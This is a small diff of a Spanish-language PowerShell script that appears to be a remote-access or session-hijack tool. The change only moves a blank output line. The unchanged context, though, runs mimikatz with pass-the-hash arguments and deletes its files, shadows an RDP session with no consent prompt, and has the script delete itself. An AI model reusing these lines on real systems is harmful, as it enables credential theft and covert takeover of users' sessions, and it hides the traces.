@@ -263,8 +263,9 @@ function EnableTLS {
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
+Write-Host ""
 $session = get-pssession
-if ($session){ Write-Host "" ; Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 3000 }
+if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 3000 }
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
 $PScript = $MyInvocation.MyCommand.Definition
 Remove-Item $PScript
